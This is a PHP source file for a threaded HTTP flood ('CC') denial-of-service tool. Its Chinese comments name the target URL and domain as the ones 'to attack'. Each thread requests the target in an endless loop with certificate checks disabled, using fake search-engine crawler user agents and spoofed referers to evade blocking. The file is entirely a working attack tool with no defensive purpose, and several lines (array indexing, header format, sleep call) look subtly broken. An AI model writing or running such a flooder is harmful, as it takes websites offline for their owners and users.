<?php
class CC extends Thread{
    // 要攻击的url
    private $url;
    // 要攻击的域名
    private $host;
    // user-agent
    private $userAgent = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36 MicroMessenger/5.2.380',
        'Mozilla/5.0 (compatible; Baiduspider/2.0;+http://www.baidu.com/search/spider.html)',
        'Mozilla/5.0 (Linux;u;Android 4.2.2;zh-cn;) AppleWebKit/534.46 (KHTML,likeGecko) Version/5.1 Mobile Safari/10600.6.3 (compatible; Baiduspider/2.0;+http://www.baidu.com/search/spider.html)',
        'Mozilla/5.0 (compatible;Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 likeMac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143Safari/601.1 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)',
        'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
        'Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)',
        'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0); 360Spider'
    ];

    // 模拟请求来源
    private $referers = array(
        'https://www.baidu.com?k=',
        'https://www.sogou.com?keyword=',
        'https://www.so.com?keyword=',
        'https://www.google.com?k=',
        'https://m.baidu.com?keyword=',
        'https://m.sogou.com?keyword=',
        'https://m.so.com?key='
    );

    public function __construct($url)
    {
        $this->url = $url;
        $this->parserUrl();
    }

    /**
     * 解析host
     */
    private function parserUrl()
    {
        $parser = parse_url($this->url);
        $this->host = $parser['host'];
    }

    /**
     * 获取头信息
     * @return void
     */
    private function getHeader(){
        $referer = $this->referers[mt_rand(0,count($this->referers))];
        $userAgent = $this->userAgent[mt_rand(0,count($this->userAgent))];
        return [
            'Host'=>$this->host,
            'Referer'=>$referer,
            'User-Agent'=>$userAgent,
            'Accept'=>'text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8',
            'Accept-Language'=>' en-US,en;q=0.5',
            'Accept-Charset'=>'iso-8859-1',
            'Accept-Encoding'=>'gzip',
            'Connection'=>'Keep-Alive'
        ];
    }


    /**
     * 实现访问
     */
    public function request()
    {
        $header = $this->getHeader();
        $curl = curl_init();
        // CURL头信息设置
        curl_setopt($curl, CURLOPT_HTTPHEADER, $header);
        curl_setopt($curl, CURLOPT_URL, $this->url);
        curl_setopt($curl, CURLOPT_TIMEOUT, 30);
        curl_setopt($curl, CURLOPT_HEADER, false);
        curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
        $res = curl_exec($curl);
        var_dump($res);
//        echo $this->url."\n";
        curl_close($curl);
    }

    public function run()
    {
        while(true){
            $this->request();
            sleep(0.3);
        }
    }
}
